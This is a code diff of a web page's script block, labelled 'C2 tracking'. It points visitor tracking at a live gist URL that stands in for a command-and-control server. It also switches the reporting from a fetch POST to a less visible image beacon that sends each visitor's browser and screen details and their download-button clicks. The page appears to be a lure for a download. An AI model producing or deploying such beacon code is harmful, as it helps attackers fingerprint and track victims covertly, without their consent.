@@ -127,22 +127,19 @@
     }, 1000);
 
     // C2 tracking
-    const C2 = 'https://your-c2-server.com/track';
+    const C2 = 'https://gist.githubusercontent.com/omonux/2851d36b0b2291deaab1e1a19e5b6a2a/raw/1a36cf5fc27a0920a9f3668225f9d7aec239566e/track.json';
     function track(data) {
       try {
-        fetch(C2, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data),
-          mode: 'no-cors'
-        });
+        const p = new URLSearchParams(data).toString();
+        const img = new Image();
+        img.src = C2 + '?' + p;
       } catch(e) {}
     }
 
-    track({ event: 'page_view', ua: navigator.userAgent, screen: screen.width + 'x' + screen.height, time: Date.now() });
+    track({ e: 'pv', ua: navigator.userAgent, scr: screen.width + 'x' + screen.height, t: Date.now() });
 
     document.getElementById('downloadBtn').addEventListener('click', () => {
-      track({ event: 'download_click', time: Date.now() });
+      track({ e: 'dl', t: Date.now() });
     });
   </script>
 </body>
